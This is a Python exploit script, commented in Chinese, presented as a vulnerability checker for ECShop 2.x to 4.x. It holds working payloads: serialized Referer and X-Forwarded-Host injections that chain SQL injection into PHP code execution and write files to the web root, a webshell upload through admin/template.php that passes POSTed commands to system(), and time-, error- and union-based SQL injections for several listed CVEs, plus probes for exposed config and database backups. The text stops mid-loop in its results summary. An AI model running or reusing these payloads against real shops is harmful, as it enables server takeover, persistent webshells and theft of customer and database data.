#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
ECShop 综合漏洞检测脚本 v1.0
覆盖 2.x / 3.x / 4.x 主要 RCE 和 SQL 注入漏洞
仅用于授权安全测试 / 靶场验证

漏洞覆盖:
  [RCE-1] 2.x/3.x Referer 头注入 RCE (xianzhi-2017-02-82239600)
          通过 Referer 投递序列化 payload → insert_ads SQL 注入 → eval() 代码执行
  [RCE-2] 4.x collection_list SQL 注入 (CVE-2024-31025)
          通过 X-Forwarded-Host 头注入 → insert_user_account / insert_pay_log
  [RCE-3] 4.1.5 任意文件上传 RCE (CVE-2023-0783)
          /admin/template.php 未限制上传类型 → webshell
  [SQL-1] 4.1.8 /admin/view_sendlist.php SQL 注入 (CVE-2024-1530)
  [SQL-2] 4.1.1 /admin/order.php SQL 注入 (CVE-2023-5294)
  [SQL-3] 4.1.5 /admin/leancloud.php SQL 注入 (CVE-2023-5293)
  [SQL-4] 2.7.6 /flow.php SQL 注入 (CVE-2020-22204)
  [SQL-5] 3.0 /admin/affiliate_ck.php & shophelp.php SQL 注入 (CVE-2020-22205/6)
  [INFO] 常见信息泄露路径探测
"""

import requests
import sys
import argparse
import re
import random
import string
import time
import urllib.parse
import hashlib
from typing import Optional, Tuple, List, Dict

import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)


# ===================== 工具函数 =====================

class C:
    """终端颜色"""
    GRN = '\033[92m'
    RED = '\033[91m'
    YLW = '\033[93m'
    BLU = '\033[94m'
    CYN = '\033[96m'
    RST = '\033[0m'
    BLD = '\033[1m'


def safe_print(*args, **kwargs):
    """绕过 Windows GBK 终端编码问题"""
    try:
        print(*args, **kwargs)
    except UnicodeEncodeError:
        for a in args:
            try:
                print(a, **kwargs)
            except UnicodeEncodeError:
                enc = sys.stdout.encoding or 'utf-8'
                print(str(a).encode(enc, errors='replace').decode(enc, errors='replace'), **kwargs)


def banner():
    safe_print(f"""
{C.RED}╔══════════════════════════════════════════════════════════════╗
║       ECShop 综合漏洞检测工具 v1.0                             ║
║       2.x / 3.x / 4.x RCE + SQL 注入覆盖                     ║
╚══════════════════════════════════════════════════════════════╝{C.RST}""")


def randstr(n: int = 8) -> str:
    return ''.join(random.choices(string.ascii_lowercase, k=n))


def build_url(base: str, path: str) -> str:
    return f"{base.rstrip('/')}/{path.lstrip('/')}"


def new_session(timeout: int = 10, cookie: str = None) -> requests.Session:
    s = requests.Session()
    s.verify = False
    s.headers.update({
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
        'Accept': 'text/html,application/xhtml+xml,*/*',
    })
    if cookie:
        s.headers['Cookie'] = cookie
    s.timeout = timeout
    return s


# ===================== 0. 指纹检测 =====================

def detect_ecshop(url: str, s: requests.Session) -> Tuple[bool, Optional[str], Optional[str]]:
    """检测是否为 ECShop 并尝试获取版本"""
    safe_print(f"\n{C.YLW}[0] 指纹检测{C.RST}")

    indicators = {
        'ecshop': ['ecshop', 'ECS_ID', 'ecshoptemplate', 'ecs_users', 'ecs_goods'],
        'version_file': ['/version.php', '/includes/version.php', '/data/config.php'],
        'js_paths': ['/js/common.js', '/js/shopping_flow.js', '/themes/default/images/logo.gif'],
    }

    # 1. 访问首页检测特征
    try:
        r = s.get(url, timeout=10)
        text = r.text.lower()

        found = []
        for kw in indicators['ecshop']:
            if kw.lower() in text:
                found.append(kw)
        if found:
            safe_print(f"  {C.GRN}[+] 确认 ECShop (特征: {', '.join(found)}){C.RST}")
        else:
            # 检查 header
            for h in ['Set-Cookie', 'X-Powered-By']:
                val = r.headers.get(h, '')
                if 'ecs' in val.lower() or 'ecshop' in val.lower():
                    safe_print(f"  {C.GRN}[+] Header 含 ECShop 痕迹: {h}={val}{C.RST}")
                    found.append(h)
        if not found:
            safe_print(f"  {C.CYN}[-] 首页未检测到 ECShop 指纹 (将继续){C.RST}")
    except Exception as e:
        safe_print(f"  {C.YLW}[!] 无法访问首页: {e}{C.RST}")

    # 2. 尝试版本文件
    ver = None
    ver_paths = ['/version.php', '/includes/version.php', '/data/config.php']
    for vp in ver_paths:
        try:
            # 尝试读取 version.php (通常会暴露版本)
            r = s.get(build_url(url, vp), timeout=8)
            m = re.search(r'VERSION["\']?\s*[:=]\s*["\']?(\d+\.\d+(?:\.\d+)?)', r.text, re.IGNORECASE)
            if m:
                ver = m.group(1)
                safe_print(f"  {C.GRN}[+] 版本: {ver} (来自 {vp}){C.RST}")
                break
            # ECShop 4.x /includes/version.php
            m2 = re.search(r'ECShop\s*V?(\d+\.\d+(?:\.\d+)?)', r.text, re.IGNORECASE)
            if m2:
                ver = m2.group(1)
                safe_print(f"  {C.GRN}[+] 版本: {ver} (来自 {vp}){C.RST}")
                break
        except Exception:
            continue

    # 3. 通过已知路径差异判断大版本
    if not ver:
        # 2.x vs 3.x vs 4.x 路径差异
        probes = [
            ('/admin', 'ECShop 管理中心', '2.x/3.x 后台'),
            ('/admin/index.php', 'ECShop', '管理后台'),
            ('/js/common.js', 'ecshop', '2.x'),
            ('/mobile/', '', '3.x/4.x mobile'),
        ]
        for path, expect, label in probes:
            try:
                r = s.get(build_url(url, path), timeout=6)
                if expect.lower() in r.text.lower():
                    safe_print(f"  {C.GRN}[+] 发现: {label} ({path}){C.RST}")
            except Exception:
                continue

    if not ver:
        safe_print(f"  {C.CYN}[-] 无法确定版本 (将以通用模式检测){C.RST}")

    return True if found else False, ver, None


# ===================== 1. 2.x/3.x Referer 头注入 RCE =====================

ECSHOP_ECHASH_2X = '554fcae493e564ee0dc75bdf2ebf94ca'
ECSHOP_ECHASH_3X = '45ea207d7a2b68c49582d2d22adf953a'


def build_referer_payload(echash: str, php_code: str, func: str = 'ads') -> str:
    """
    构造 Referer 头 payload
    利用 insert_ads() 的 SQL 注入 → eval() 执行任意 PHP 代码

    参数:
      echash: 版本对应的 echash 常量
      php_code: 要执行的 PHP 代码, 会被 base64 编码
      func: 利用的 insert_ 函数名 (ads/user_account/pay_log)
    """
    # base64 编码 PHP 代码
    php_b64 = php_code.encode('utf-8')
    php_hex = php_b64.hex()

    # 构造 shell payload: {$asd'];assert(base64_decode('...'));//}xxx
    # 注意: 实际长度需要计算
    php_b64_str = php_b64.decode('utf-8')  # 保留原始 base64 字符串
    shell_code = f"{{$asd'];assert(base64_decode('{php_b64_str}'));//}}xxx"
    shell_hex = shell_code.encode('utf-8').hex()

    # 构造 id 字段
    id_val = "'/*"
    id_hex = id_val.encode('utf-8').hex()

    # 构造序列化数组
    # num: */ union select 1,0x{id_hex},3,4,5,6,7,8,0x{shell_hex},10-- -
    num_sql = f"*/ union select 1,0x{id_hex},3,4,5,6,7,8,0x{shell_hex},10-- -"
    num_len = len(num_sql)

    payload = (
        f'{echash}{func}|'
        f'a:2:{{'
        f's:3:"num";s:{num_len}:"{num_sql}";'
        f's:2:"id";s:3:"{id_val}";'
        f'}}|'
        f'{echash}'
    )
    return payload


def check_2x_3x_referer_rce(url: str, s: requests.Session) -> List[str]:
    """
    [RCE-1] 2.x/3.x Referer 头注入 RCE
    通过 Referer 投递序列化 payload → insert_ads SQL注入 → eval() 代码执行
    条件: 无需登录 (2.x) / 某些 3.x 也不需要登录
    """
    safe_print(f"\n{C.YLW}[RCE-1] 2.x/3.x Referer 头注入 RCE (xianzhi-2017-02-82239600){C.RST}")

    rk = randstr(8)
    flag = f"EC{rk}"
    hits = []

    # payload: 写入验证文件到 web 根目录
    verify_file = f"ec_{randstr(6)}.php"
    php_code = f"echo '{flag}';"

    # 针对 2.x 和 3.x 分别构造
    targets = [
        {
            'version': '2.x',
            'echash': ECSHOP_ECHASH_2X,
            'endpoints': [
                '/user.php?act=login',
                '/user.php',
                '/index.php',
                '/',
            ],
        },
        {
            'version': '3.x',
            'echash': ECSHOP_ECHASH_3X,
            'endpoints': [
                '/user.php?act=login',
                '/user.php',
                '/index.php',
                '/',
            ],
        },
    ]

    for target in targets:
        ver_label = target['version']
        echash = target['echash']

        safe_print(f"  {C.CYN}[*] 测试 {ver_label} echash{C.RST}")

        # 构造 payloads
        # Payload 1: phpinfo 探针 (仅检测不写入文件)
        info_code = "phpinfo();"
        php_info_b64 = info_code.encode('utf-8').decode('utf-8')  # 不编码，直接拼接
        # 直接拼到 eval 里
        shell_info = f"{{$asd'];phpinfo();//}}xxx"
        shell_info_hex = shell_info.encode('utf-8').hex()
        id_val = "'/*"
        id_hex = id_val.encode('utf-8').hex()
        num_info_sql = f"*/ union select 1,0x{id_hex},3,4,5,6,7,8,0x{shell_info_hex},10-- -"
        num_info_len = len(num_info_sql)

        info_payload = (
            f'{echash}ads|'
            f'a:2:{{'
            f's:3:"num";s:{num_info_len}:"{num_info_sql}";'
            f's:2:"id";s:3:"{id_val}";'
            f'}}|'
            f'{echash}'
        )

        # Payload 2: 写入验证文件的代码
        shell_write_code = f"file_put_contents('{verify_file}','<?php echo \\'{flag}\\'; ?>');"
        shell_write_b64 = shell_write_code.encode('utf-8').decode('utf-8')  # base64 编码问题...

        # 实际上需要 base64 编码
        import base64
        shell_write_b64 = base64.b64encode(shell_write_code.encode('utf-8')).decode('utf-8')
        shell_tpl = f"{{$asd'];assert(base64_decode('{shell_write_b64}'));//}}xxx"
        shell_tpl_hex = shell_tpl.encode('utf-8').hex()
        num_write_sql = f"*/ union select 1,0x{id_hex},3,4,5,6,7,8,0x{shell_tpl_hex},10-- -"
        num_write_len = len(num_write_sql)

        write_payload = (
            f'{echash}ads|'
            f'a:2:{{'
            f's:3:"num";s:{num_write_len}:"{num_write_sql}";'
            f's:2:"id";s:3:"{id_val}";'
            f'}}|'
            f'{echash}'
        )

        for endpoint in target['endpoints']:
            full_url = build_url(url, endpoint)

            # 第一种: phpinfo 探针 (不写文件，更安全)
            try:
                s2 = new_session(timeout=s.timeout if hasattr(s, 'timeout') else 10)
                s2.headers['Referer'] = info_payload
                r = s2.get(full_url, timeout=12)

                if 'PHP Version' in r.text or 'phpinfo' in r.text.lower():
                    safe_print(f"  {C.RED}[!] {ver_label} RCE 确认 — phpinfo 执行成功! ({endpoint}){C.RST}")
                    hits.append(f"2.x/3.x Referer RCE ({ver_label}, phpinfo)")
                    break

                # 检查是否有 SQL 报错(也是漏洞存在的证据)
                if any(e in r.text.lower() for e in ['mysql', 'syntax', 'sql', 'ecs_ads']):
                    safe_print(f"  {C.YLW}[~] {ver_label} 可能存在 (SQL 报错回显) — {endpoint}{C.RST}")

            except Exception:
                continue

            # 第二种: 写入验证文件
            try:
                s3 = new_session(timeout=s.timeout if hasattr(s, 'timeout') else 10)
                s3.headers['Referer'] = write_payload
                r = s3.get(full_url, timeout=12)

                # 检查写入的 shell
                time.sleep(1.5)
                r_verify = s.get(build_url(url, verify_file), timeout=8)
                if flag in r_verify.text:
                    safe_print(f"  {C.RED}[!] {ver_label} Webshell 写入成功!{C.RST}")
                    safe_print(f"  {C.RED}    Shell: {build_url(url, verify_file)}{C.RST}")
                    hits.append(f"2.x/3.x Referer RCE ({ver_label}, webshell)")
                    break
            except Exception:
                continue

        if hits:
            break

    if not hits:
        safe_print(f"  {C.CYN}[-] 未发现 2.x/3.x Referer RCE{C.RST}")
    return hits


# ===================== 2. 4.x collection_list SQL 注入 =====================

def check_4x_collection_list_sqli(url: str, s: requests.Session) -> List[str]:
    """
    [RCE-2] 4.x collection_list SQL 注入
    通过 X-Forwarded-Host 投递序列化 payload
    利用 insert_user_account / insert_pay_log
    条件: 需要已登录的 Cookie
    """
    safe_print(f"\n{C.YLW}[RCE-2] 4.x collection_list SQL 注入 (CVE-2024-31025){C.RST}")
    safe_print(f"  {C.CYN}[*] 需要登录态, 先在匿名模式下探测{C.RST}")

    echash = ECSHOP_ECHASH_3X  # 4.x 仍使用 3.x 的 echash
    hits = []

    # 匿名探测: 确认端点和注入点存在
    probes = [
        {
            'func': 'user_account',
            'payload': f"{echash}user_account|a:2:{{s:7:\"user_id\";s:38:\"0'-(updatexml(1,repeat(user(),2),1))-'\";s:7:\"payment\";s:1:\"4\";}}|{echash}"
        },
        {
            'func': 'pay_log',
            'payload': f"{echash}pay_log|s:44:\"1' and updatexml(1,repeat(user(),2),1) and '\";|{echash}"
        },
    ]

    endpoints = [
        '/user.php?act=collection_list',
        '/user.php?act=order_list',
    ]

    for ep in endpoints:
        for probe in probes:
            # 先尝试匿名
            try:
                s2 = new_session(timeout=s.timeout if hasattr(s, 'timeout') else 10)
                s2.headers['X-Forwarded-Host'] = probe['payload']
                r = s2.get(build_url(url, ep), timeout=12)

                # updatexml 报错回显
                err_keywords = ['XPATH', 'updatexml', 'syntax error', 'SQLSTATE',
                               'Duplicate entry', 'ecs_user_account', 'ecs_pay_log']
                for ek in err_keywords:
                    if ek.lower() in r.text.lower():
                        safe_print(f"  {C.RED}[!] SQL 注入确认 ({probe['func']}) — {ep}{C.RST}")
                        safe_print(f"  {C.RED}    回显: {r.text[:200]}{C.RST}")
                        hits.append(f"4.x collection_list SQLi ({probe['func']})")
                        return hits

                # 即使没有报错，200 且内容异常也可能是注入点
                if r.status_code == 200 and len(r.text) > 100:
                    # 尝试用时间盲注
                    time_payload = f"{echash}{probe['func']}|s:50:\"1' and (select sleep(5)) and '\";|{echash}"
                    s3 = new_session(timeout=s.timeout if hasattr(s, 'timeout') else 10)
                    s3.headers['X-Forwarded-Host'] = time_payload
                    t0 = time.time()
                    r2 = s3.get(build_url(url, ep), timeout=15)
                    elapsed = time.time() - t0
                    if elapsed > 4.5:
                        safe_print(f"  {C.RED}[!] 时间盲注确认 ({probe['func']}) — 延时 {elapsed:.1f}s{C.RST}")
                        hits.append(f"4.x collection_list SQLi ({probe['func']}, time-based)")
                        return hits

            except Exception:
                continue

    if not hits:
        safe_print(f"  {C.CYN}[-] 未发现 4.x collection_list SQL 注入 (匿名模式){C.RST}")
        safe_print(f"  {C.CYN}    (如果有有效的 ECS Cookie, 用 --cookie 参数重试){C.RST}")
    return hits


# ===================== 3. 4.1.5 任意文件上传 RCE =====================

def check_4x_file_upload_rce(url: str, s: requests.Session) -> List[str]:
    """
    [RCE-3] CVE-2023-0783: /admin/template.php 任意文件上传
    影响: ECShop 4.1.5 (也确认影响 4.1.8)
    CVSS: 9.8 CRITICAL — 无需认证
    """
    safe_print(f"\n{C.YLW}[RCE-3] CVE-2023-0783: /admin/template.php 任意文件上传{C.RST}")

    hits = []
    rk = randstr(6)
    shell_name = f"ec_{rk}.php"
    flag = randstr(10)

    # 探测 admin 目录
    admin_paths = ['/admin', '/admin/', '/ecshop/admin', '/ecshop/admin/']
    admin_found = None

    for ap in admin_paths:
        try:
            r = s.get(build_url(url, ap), timeout=8)
            if r.status_code in [200, 302, 301, 403] and len(r.text) > 50:
                admin_found = ap.rstrip('/')
                safe_print(f"  {C.GRN}[+] 后台路径: {build_url(url, ap)}{C.RST}")
                break
        except Exception:
            continue

    if not admin_found:
        # 尝试常见变体
        safe_print(f"  {C.CYN}[-] 未找到后台路径, 尝试默认 /admin{C.RST}")
        admin_found = '/admin'

    # 检测 template.php 是否可访问
    template_url = build_url(url, f"{admin_found}/template.php")
    try:
        r = s.get(template_url, timeout=8)
        if r.status_code == 200:
            safe_print(f"  {C.GRN}[+] template.php 可访问: {template_url}{C.RST}")

            # 尝试上传 webshell
            # ECShop 4.x 模板编辑可能允许直接编辑 PHP 模板
            # 尝试 POST 写入模板文件
            shell_content = f"<?php echo '{flag}'; system($_POST['cmd']); ?>"

            upload_endpoints = [
                f"{admin_found}/template.php?act=upload",
                f"{admin_found}/template.php?act=save",
                f"{admin_found}/template.php?act=edit",
                f"{admin_found}/template.php?act=new",
            ]

            for ue in upload_endpoints:
                try:
                    files = {
                        'file': (shell_name, shell_content, 'application/octet-stream'),
                        'img': (shell_name, shell_content, 'image/jpeg'),
                    }
                    # 尝试 multipart
                    r = s.post(build_url(url, ue), files=files, timeout=10)
                    if r.status_code == 200:
                        safe_print(f"  {C.YLW}[~] 上传 endpoint 已提交: {ue}{C.RST}")

                        # 尝试找上传后的 shell
                        verify_dirs = ['/', '/admin/', '/ecshop/admin/', '/uploadfile/',
                                      '/includes/', '/themes/', '/data/']
                        for vd in verify_dirs:
                            for vn in [shell_name, f"../{shell_name}"]:
                                try:
                                    vurl = build_url(url, f"{vd}{shell_name}")
                                    rv = s.get(vurl, timeout=6)
                                    if flag in rv.text:
                                        safe_print(f"  {C.RED}[!] Webshell 上传成功!{C.RST}")
                                        safe_print(f"  {C.RED}    Shell: {vurl}{C.RST}")
                                        safe_print(f"  {C.RED}    CMD: POST cmd=id{C.RST}")
                                        hits.append(f"CVE-2023-0783 文件上传 RCE ({vurl})")
                                        return hits
                                except Exception:
                                    continue
                except Exception:
                    continue

            safe_print(f"  {C.YLW}[~] 上传尝试完成，但未找到可访问的 webshell{C.RST}")
        elif r.status_code in [403, 401]:
            safe_print(f"  {C.YLW}[~] template.php 需要认证: {template_url} (status={r.status_code}){C.RST}")
        else:
            safe_print(f"  {C.CYN}[-] template.php 不可达: status={r.status_code}{C.RST}")
    except Exception as e:
        safe_print(f"  {C.CYN}[-] template.php 访问失败: {e}{C.RST}")

    if not hits:
        safe_print(f"  {C.CYN}[-] 未确认 CVE-2023-0783{C.RST}")
    return hits


# ===================== 4. 4.1.8 SQL 注入 (CVE-2024-1530) =====================

def check_cve_2024_1530(url: str, s: requests.Session) -> List[str]:
    """
    [SQL-1] CVE-2024-1530: /admin/view_sendlist.php SQL 注入
    影响: ECShop 4.1.8
    条件: 需要管理后台 Cookie
    """
    safe_print(f"\n{C.YLW}[SQL-1] CVE-2024-1530: /admin/view_sendlist.php SQL 注入{C.RST}")

    hits = []
    admin_paths = ['/admin', '/ecshop/admin']

    for ap in admin_paths:
        try:
            target = build_url(url, f"{ap}/view_sendlist.php")
            # 时间盲注
            t0 = time.time()
            r = s.get(target + "?id=1' and sleep(3)-- -", timeout=12)
            elapsed = time.time() - t0

            if elapsed > 2.5:
                safe_print(f"  {C.RED}[!] 时间盲注确认 — 延时 {elapsed:.1f}s{C.RST}")
                safe_print(f"  {C.RED}    端点: {target}{C.RST}")
                hits.append("CVE-2024-1530 SQLi (view_sendlist.php)")
                return hits

            # 报错注入
            r2 = s.get(target + "?id=1' and updatexml(1,concat(0x7e,database()),1)-- -", timeout=10)
            for ek in ['XPATH', 'updatexml', 'Duplicate entry', 'ecshop']:
                if ek.lower() in r2.text.lower():
                    safe_print(f"  {C.RED}[!] 报错注入确认 — 回显: {r2.text[:150]}{C.RST}")
                    hits.append("CVE-2024-1530 SQLi (view_sendlist.php)")
                    return hits

        except Exception:
            continue

    safe_print(f"  {C.CYN}[-] 未确认 CVE-2024-1530 (可能需要有效 Cookie){C.RST}")
    return hits


# ===================== 5. 4.1.x admin SQL 注入 (CVE-2023-5293/5294) =====================

def check_cve_2023_529x(url: str, s: requests.Session) -> List[str]:
    """
    [SQL-2/3] CVE-2023-5294 & CVE-2023-5293
    /admin/order.php (goods_id) + /admin/leancloud.php (id)
    影响: ECShop 4.1.1 ~ 4.1.5
    """
    safe_print(f"\n{C.YLW}[SQL-2/3] CVE-2023-5293/5294: admin SQL 注入{C.RST}")

    hits = []
    tests = [
        {
            'path': '/admin/order.php',
            'param': 'goods_id',
            'payload': "1' and updatexml(1,concat(0x7e,database()),1)-- -",
            'cve': 'CVE-2023-5294',
            'method': 'GET',
        },
        {
            'path': '/admin/leancloud.php',
            'param': 'id',
            'payload': "1' and updatexml(1,concat(0x7e,database()),1)-- -",
            'cve': 'CVE-2023-5293',
            'method': 'GET',
        },
        {
            'path': '/admin/order.php',
            'param': 'goods_id',
            'payload': "1' and sleep(3)-- -",
            'cve': 'CVE-2023-5294 (time)',
            'method': 'GET',
        },
    ]

    for test in tests:
        try:
            target = build_url(url, test['path'])
            t0 = time.time()
            r = s.get(f"{target}?{test['param']}={urllib.parse.quote(test['payload'])}", timeout=12)
            elapsed = time.time() - t0

            # 报错回显
            for ek in ['XPATH', 'updatexml', 'Duplicate entry', 'database()', 'mysql']:
                if ek.lower() in r.text.lower():
                    safe_print(f"  {C.RED}[!] {test['cve']} 确认 — {test['path']}{C.RST}")
                    safe_print(f"  {C.RED}    回显: {r.text[:180]}{C.RST}")
                    hits.append(f"{test['cve']} SQLi ({test['path']})")
                    return hits

            # 时间盲注
            if elapsed > 2.5:
                safe_print(f"  {C.RED}[!] {test['cve']} 时间盲注 — 延时 {elapsed:.1f}s{C.RST}")
                hits.append(f"{test['cve']} SQLi ({test['path']}, time)")
                return hits

        except Exception:
            continue

    # 额外探测 /ecshop/admin/ 路径
    for test in tests:
        try:
            target = build_url(url, f"/ecshop{test['path']}")
            r = s.get(f"{target}?{test['param']}={urllib.parse.quote(test['payload'])}", timeout=12)
            for ek in ['XPATH', 'updatexml', 'Duplicate entry']:
                if ek.lower() in r.text.lower():
                    safe_print(f"  {C.RED}[!] {test['cve']} 确认 — /ecshop{test['path']}{C.RST}")
                    hits.append(f"{test['cve']} SQLi (/ecshop{test['path']})")
                    return hits
        except Exception:
            continue

    safe_print(f"  {C.CYN}[-] 未确认 CVE-2023-5293/5294{C.RST}")
    return hits


# ===================== 6. 2.7.6 /flow.php SQL 注入 (CVE-2020-22204) =====================

def check_cve_2020_22204(url: str, s: requests.Session) -> List[str]:
    """
    [SQL-4] CVE-2020-22204: 2.7.6 /flow.php goods_number SQL 注入
    条件: 无需登录
    """
    safe_print(f"\n{C.YLW}[SQL-4] CVE-2020-22204: 2.7.6 /flow.php SQL 注入{C.RST}")

    hits = []
    target = build_url(url, '/flow.php')

    tests = [
        # 报错注入
        ("?step=add_to_cart&goods_number=1' and updatexml(1,concat(0x7e,database()),1)-- -", "报错注入"),
        # 时间盲注
        ("?step=add_to_cart&goods_number=1' and sleep(3)-- -", "时间盲注"),
        # 布尔盲注
        ("?step=add_to_cart&goods_number=1' and 1=1-- -", "布尔检测"),
        # union 注入
        ("?step=add_to_cart&goods_number=-1' union select 1,2,3,4,5,6,7,8,9,10-- -", "union 注入"),
    ]

    for query, desc in tests:
        try:
            t0 = time.time()
            r = s.get(f"{target}{query}", timeout=12)
            elapsed = time.time() - t0

            for ek in ['XPATH', 'updatexml', 'mysql', 'Duplicate entry', 'syntax']:
                if ek.lower() in r.text.lower():
                    safe_print(f"  {C.RED}[!] {desc} 确认 — {target}{C.RST}")
                    safe_print(f"  {C.RED}    回显: {r.text[:180]}{C.RST}")
                    hits.append(f"CVE-2020-22204 SQLi (/flow.php, {desc})")
                    return hits

            if elapsed > 2.5:
                safe_print(f"  {C.RED}[!] {desc} 确认 — 延时 {elapsed:.1f}s{C.RST}")
                hits.append(f"CVE-2020-22204 SQLi (/flow.php, {desc})")
                return hits

        except Exception:
            continue

    safe_print(f"  {C.CYN}[-] 未确认 CVE-2020-22204{C.RST}")
    return hits


# ===================== 7. 3.0 admin SQL 注入 (CVE-2020-22205/6) =====================

def check_cve_2020_2220x(url: str, s: requests.Session) -> List[str]:
    """
    [SQL-5] CVE-2020-22205 & CVE-2020-22206
    /admin/affiliate_ck.php (aid) + /admin/shophelp.php (id)
    影响: ECShop 3.0
    """
    safe_print(f"\n{C.YLW}[SQL-5] CVE-2020-22205/22206: 3.0 admin SQL 注入{C.RST}")

    hits = []
    tests = [
        ('/admin/affiliate_ck.php', 'aid', 'CVE-2020-22206'),
        ('/admin/shophelp.php', 'id', 'CVE-2020-22205'),
    ]

    payloads = [
        ("1' and updatexml(1,concat(0x7e,database()),1)-- -", "报错"),
        ("1' and sleep(3)-- -", "延时"),
    ]

    for path, param, cve_id in tests:
        for payload, ptype in payloads:
            try:
                target = build_url(url, path)
                t0 = time.time()
                r = s.get(f"{target}?{param}={urllib.parse.quote(payload)}", timeout=12)
                elapsed = time.time() - t0

                for ek in ['XPATH', 'updatexml', 'Duplicate entry', 'mysql']:
                    if ek.lower() in r.text.lower():
                        safe_print(f"  {C.RED}[!] {cve_id} 确认 ({ptype}) — {path}{C.RST}")
                        safe_print(f"  {C.RED}    回显: {r.text[:180]}{C.RST}")
                        hits.append(f"{cve_id} SQLi ({path})")
                        return hits

                if elapsed > 2.5:
                    safe_print(f"  {C.RED}[!] {cve_id} {ptype} — 延时 {elapsed:.1f}s{C.RST}")
                    hits.append(f"{cve_id} SQLi ({path}, {ptype})")
                    return hits

            except Exception:
                continue

    safe_print(f"  {C.CYN}[-] 未确认 CVE-2020-22205/6{C.RST}")
    return hits


# ===================== 8. 信息泄露探测 =====================

def check_info_disclosure(url: str, s: requests.Session) -> List[str]:
    """探测常见信息泄露路径"""
    safe_print(f"\n{C.YLW}[INFO] 信息泄露探测{C.RST}")

    hits = []
    paths = [
        # 配置文件
        ('/data/config.php', '配置文件', ['db_host', 'db_user', 'db_name', 'DB_HOST']),
        ('/data/config.php.bak', '配置备份', ['db_host', 'db_user']),
        ('/includes/config.php', '配置(旧版)', ['db_host', 'db_user']),
        ('/includes/configure.php', '配置(2.x)', ['db_host', 'define']),
        # 数据库备份
        ('/data/sqldata/', '数据库备份目录', ['Index of', 'Parent Directory']),
        ('/data/backup/', '备份目录', ['Index of', 'Parent Directory', '.sql']),
        # 敏感文件
        ('/admin/backup.php', '数据库备份页面', ['backup', '备份']),
        ('/admin/database.php', '数据库管理页面', ['database', '数据']),
        # 调试信息
        ('/index.php?debug=1', '调试模式', ['error', 'trace', 'debug', 'php']),
        ('/?debug=1', '调试模式2', ['error', 'trace', 'debug']),
        # 安装文件
        ('/install/', '安装目录', ['install', '安装', 'setup']),
        ('/install/index.php', '安装脚本', ['install', '安装']),
        # PHPInfo
        ('/phpinfo.php', 'phpinfo', ['PHP Version']),
        ('/info.php', 'info.php', ['PHP Version']),
        ('/test.php', 'test.php', ['PHP Version']),
        # ECShop 特定
        ('/certi.php', '授权文件', []),
        ('/api/', 'API 目录', ['Index of', 'Parent Directory']),
        ('/includes/inc_constant.php', '常量文件', ['EC_CHARSET']),
        ('/mobile/admin/', '移动端后台', []),
    ]

    for path, desc, keywords in paths:
        try:
            r = s.get(build_url(url, path), timeout=8)
            if r.status_code == 200:
                matched = [kw for kw in keywords if kw.lower() in r.text.lower()]
                if matched or (not keywords and len(r.text) > 50):
                    ctx = r.text[:120].replace('\n', ' ').replace('\r', '')
                    safe_print(f"  {C.RED}[!] {desc} — 可访问: {path}{C.RST}")
                    if matched:
                        safe_print(f"  {C.RED}    匹配: {', '.join(matched)}{C.RST}")
                    if ctx:
                        safe_print(f"  {C.YLW}    {ctx}{C.RST}")
                    hits.append(f"信息泄露 ({desc}, {path})")
        except Exception:
            continue

    if not hits:
        safe_print(f"  {C.CYN}[-] 未发现常见信息泄露{C.RST}")
    return hits


# ===================== 9. 通用误报降噪 =====================

def normalize_target(url: str) -> str:
    """保证 URL 格式一致"""
    url = url.strip()
    if not url.startswith('http://') and not url.startswith('https://'):
        url = 'http://' + url
    return url.rstrip('/')


# ===================== 主流程 =====================

def main():
    banner()

    parser = argparse.ArgumentParser(
        description='ECShop 综合漏洞检测工具 v1.0',
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog='''
使用示例:
  python ecshop_check.py -u http://10.16.1.209
  python ecshop_check.py -u http://target.com --cookie "ECS_ID=xxx;ECS[user_id]=1"
  python ecshop_check.py -u http://target.com --rce-only
  python ecshop_check.py -u http://target.com --timeout 15 --no-color
        ''',
    )
    parser.add_argument('-u', '--url', required=True, help='目标 URL')
    parser.add_argument('--cookie', help='登录 Cookie (用于需要认证的检测)')
    parser.add_argument('--rce-only', action='store_true', help='仅检测 RCE, 跳过 SQL 注入和信息泄露')
    parser.add_argument('--skip-upload', action='store_true', help='跳过文件上传检测 (避免留下痕迹)')
    parser.add_argument('--skip-info', action='store_true', help='跳过信息泄露探测')
    parser.add_argument('--timeout', type=int, default=10, help='请求超时秒数 (默认 10)')
    parser.add_argument('--no-color', action='store_true', help='禁用彩色输出')
    args = parser.parse_args()

    if args.no_color:
        for attr in dir(C):
            if not attr.startswith('_'):
                setattr(C, attr, '')

    url = normalize_target(args.url)
    s = new_session(args.timeout, args.cookie)

    safe_print(f"{C.BLD}目标: {url}{C.RST}")
    if args.cookie:
        safe_print(f"{C.BLD}Cookie: {args.cookie[:60]}...{C.RST}")

    # === 0. 指纹 ===
    is_ecshop, version, _ = detect_ecshop(url, s)

    all_hits: List[str] = []

    # === RCE-1: 2.x/3.x Referer RCE ===
    all_hits.extend(check_2x_3x_referer_rce(url, s))

    # === RCE-2: 4.x collection_list SQLi ===
    all_hits.extend(check_4x_collection_list_sqli(url, s))

    # === RCE-3: CVE-2023-0783 文件上传 ===
    if not args.skip_upload:
        all_hits.extend(check_4x_file_upload_rce(url, s))
    else:
        safe_print(f"\n{C.CYN}[RCE-3] 已跳过文件上传检测{C.RST}")

    if not args.rce_only:
        # === SQL-1: CVE-2024-1530 ===
        all_hits.extend(check_cve_2024_1530(url, s))

        # === SQL-2/3: CVE-2023-5293/5294 ===
        all_hits.extend(check_cve_2023_529x(url, s))

        # === SQL-4: CVE-2020-22204 ===
        all_hits.extend(check_cve_2020_22204(url, s))

        # === SQL-5: CVE-2020-22205/6 ===
        all_hits.extend(check_cve_2020_2220x(url, s))

        # === INFO: 信息泄露 ===
        if not args.skip_info:
            all_hits.extend(check_info_disclosure(url, s))
    else:
        safe_print(f"\n{C.CYN}[RCE-only] 已跳过 SQL 注入和信息泄露检测{C.RST}")

    # ========== 汇总 ==========
    safe_print(f"\n\n{C.BLU}{'=' * 60}{C.RST}")
    safe_print(f"{C.BLD}检测结果汇总{C.RST}")
    safe_print(f"{C.BLU}{'=' * 60}{C.RST}")
    safe_print(f"  目标 : {url}")
    if version:
        safe_print(f"  版本 : ECShop {version}")

    if all_hits:
        safe_print(f"\n  {C.RED}{C.BLD}共发现 {len(all_hits)} 个漏洞:{C.RST}")
        for h in all_hits:
